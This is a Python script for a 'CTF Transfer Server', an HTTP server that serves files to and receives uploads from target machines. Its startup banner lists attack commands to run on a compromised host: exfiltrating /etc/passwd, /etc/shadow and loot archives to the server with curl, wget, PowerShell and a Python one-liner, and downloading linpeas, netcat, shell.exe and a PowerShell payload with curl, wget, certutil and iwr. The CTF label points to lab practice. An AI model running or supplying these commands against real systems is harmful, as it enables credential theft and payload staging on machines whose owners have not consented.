#!/usr/bin/env python3
"""
Serves files via GET and accepts uploads via POST/PUT.

Usage:
    sudo python3 transfer_server.py              
    python3 transfer_server.py -p 8080           
    python3 transfer_server.py -d /opt/tools -u /tmp/loot
"""

import os
import sys
import cgi
import socket
import argparse
import datetime
import warnings
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler

warnings.filterwarnings("ignore", category=DeprecationWarning)

# ── ANSI color helpers ─────────────────────────────────────────────────────────

RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"

def c(text, *codes):
    return "".join(codes) + str(text) + RESET

def ts():
    return c(datetime.datetime.now().strftime("%H:%M:%S"), DIM)

# ── Upload storage ─────────────────────────────────────────────────────────────

UPLOAD_DIR = Path("uploads")


def safe_save(filename: str, data: bytes) -> Path:
    """Sanitize filename and save data, never overwriting an existing file."""
    name = Path(filename).name or "upload.bin"  # strip path traversal
    dest = UPLOAD_DIR / name
    stem, suffix = Path(name).stem, Path(name).suffix
    i = 1
    while dest.exists():
        dest = UPLOAD_DIR / f"{stem}_{i}{suffix}"
        i += 1
    dest.write_bytes(data)
    return dest


# ── Request handler ────────────────────────────────────────────────────────────

class TransferHandler(SimpleHTTPRequestHandler):

    # ── GET: serve files ───────────────────────────────────────────────────────

    def do_GET(self):
        super().do_GET()

    # ── POST: receive files ────────────────────────────────────────────────────

    def do_POST(self):
        content_type = self.headers.get("Content-Type", "")
        if "multipart/form-data" in content_type:
            self._recv_multipart()
        else:
            self._recv_raw()

    # ── PUT: receive files (curl -T style) ─────────────────────────────────────

    def do_PUT(self):
        self._recv_raw()

    # ── Receivers ──────────────────────────────────────────────────────────────

    def _recv_raw(self):
        """Accept a raw POST/PUT body. Filename taken from URL path."""
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length) if length else b""
        filename = Path(self.path.lstrip("/")).name or "upload.bin"
        dest = safe_save(filename, data)
        msg = f"[+] Saved {len(data)} bytes -> {dest}\n"
        print(
            f"{ts()}  {c(self.command[:4], CYAN, BOLD)}  "
            f"{self.client_address[0]:<16}  {self.path}"
            f"  {c(f'{len(data)} bytes', DIM)}  "
            f"{c('->', DIM)} {c(dest, YELLOW)}"
        )
        self._respond(200, msg)

    def _recv_multipart(self):
        """Accept multipart/form-data uploads (HTML form or curl -F)."""
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                "REQUEST_METHOD": "POST",
                "CONTENT_TYPE": self.headers["Content-Type"],
            },
        )
        saved = []
        for key in form.keys():
            items = form[key] if isinstance(form[key], list) else [form[key]]
            for item in items:
                if item.filename:
                    data = item.file.read()
                    dest = safe_save(item.filename, data)
                    saved.append((dest, len(data)))
                    print(
                        f"{ts()}  {c('POST', GREEN, BOLD)}  "
                        f"{self.client_address[0]:<16}  {item.filename}"
                        f"  {c(f'{len(data)} bytes', DIM)}  "
                        f"{c('->', DIM)} {c(dest, YELLOW)}"
                    )

        if saved:
            msg = "\n".join(f"[+] Saved {sz} bytes -> {p}" for p, sz in saved) + "\n"
            self._respond(200, msg)
        else:
            self._respond(400, "[-] No file fields in multipart body\n")

    # ── Response helpers ───────────────────────────────────────────────────────

    def _respond(self, code: int, msg: str):
        body = msg.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # ── Logging ────────────────────────────────────────────────────────────────

    def log_request(self, code="-", size="-"):
        if self.command == "GET":
            color = GREEN if str(code) == "200" else YELLOW
            print(
                f"{ts()}  {c('GET ', CYAN, BOLD)}  "
                f"{self.client_address[0]:<16}  {self.path}"
                f"  {c(code, color)}"
            )

    def log_message(self, fmt, *args):
        pass  # suppress default stderr noise


# ── Helpers ────────────────────────────────────────────────────────────────────

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="CTF Transfer Server — serve files and accept uploads over HTTP",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-p", "--port",       type=int, default=80,    help="Listen port (default: 80)")
    parser.add_argument("-b", "--bind",       default="0.0.0.0",       help="Bind address (default: 0.0.0.0)")
    parser.add_argument("-d", "--dir",        default=".",             help="Directory to serve (default: .)")
    parser.add_argument("-u", "--upload-dir", default="uploads",       help="Directory for received files (default: ./uploads)")
    args = parser.parse_args()

    global UPLOAD_DIR
    UPLOAD_DIR = Path(args.upload_dir).resolve()
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

    serve_dir = Path(args.dir).resolve()
    os.chdir(serve_dir)

    ip   = get_local_ip()
    host = f"{ip}:{args.port}"

    banner = f"""
{c('CTF Transfer Server', MAGENTA, BOLD)}
{'─' * 60}
  Listening   {c(f'{args.bind}:{args.port}', CYAN)}   (your IP: {c(ip, CYAN, BOLD)})
  Serving     {c(serve_dir, YELLOW)}
  Uploads →   {c(UPLOAD_DIR, GREEN)}
{'─' * 60}
{c('Exfil / upload (from target):', BOLD)}
  curl --data-binary @/etc/passwd    http://{host}/passwd
  curl -F "f=@/root/loot.zip"        http://{host}/
  wget -q --post-file=/etc/shadow    http://{host}/shadow
  # PowerShell:
  Invoke-RestMethod http://{host}/out.txt -Method POST -InFile loot.txt
  # Python one-liner (no curl/wget):
  python3 -c "import urllib.request; urllib.request.urlopen(urllib.request.Request('http://{host}/data', open('/etc/passwd','rb').read()))"
{'─' * 60}
{c('Download (to target):', BOLD)}
  curl   http://{host}/linpeas.sh -o /tmp/linpeas.sh
  wget   http://{host}/nc.exe -O /tmp/nc.exe
  certutil -urlcache -split -f http://{host}/shell.exe shell.exe
  iwr    http://{host}/payload.ps1 -OutFile C:\\\\Windows\\\\Temp\\\\p.ps1
{'─' * 60}
"""
    print(banner)

    try:
        server = HTTPServer((args.bind, args.port), TransferHandler)
        server.serve_forever()
    except PermissionError:
        print(c(f"\n[!] Permission denied on port {args.port}. Use sudo or -p 8080", RED, BOLD))
        sys.exit(1)
    except OSError as e:
        print(c(f"\n[!] {e}", RED, BOLD))
        sys.exit(1)
    except KeyboardInterrupt:
        print(c("\n[*] Server stopped.", YELLOW))


if __name__ == "__main__":
    main()
